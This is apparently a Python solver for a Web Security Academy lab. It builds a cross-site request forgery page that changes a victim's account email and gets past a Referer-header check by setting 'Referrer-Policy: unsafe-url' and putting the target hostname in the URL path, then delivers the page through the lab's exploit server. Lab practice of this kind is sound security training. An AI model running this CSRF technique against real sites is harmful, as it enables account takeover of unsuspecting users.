from web_security_academy.core.utils import generate_csrf_html

from urllib.parse import urljoin, urlparse
from requests import Request


def solve_lab(session):
    req = Request(
        "POST",
        urljoin(session.url, "/my-account/change-email"),
        data={"email": "user@example.com"},
    )

    exploit_server = session.exploit_server()
    hostname = urlparse(session.url).hostname
    headers = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html; charset=utf-8\r\n"
        "Referrer-Policy: unsafe-url"
    )
    body = generate_csrf_html(req)
    exploit_server.deliver_exploit_to_victim(f"/{hostname}", headers, body)
